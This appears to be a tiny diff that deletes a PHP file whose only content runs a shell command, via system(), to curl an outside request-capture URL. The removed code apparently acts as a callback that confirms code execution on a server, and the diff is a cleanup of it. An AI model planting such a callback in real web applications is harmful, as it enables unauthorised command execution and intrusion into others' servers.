@@ -1,3 +1,0 @@
-<?php
-  system('curl http://requestb.in/14tl3qr1');
-?>
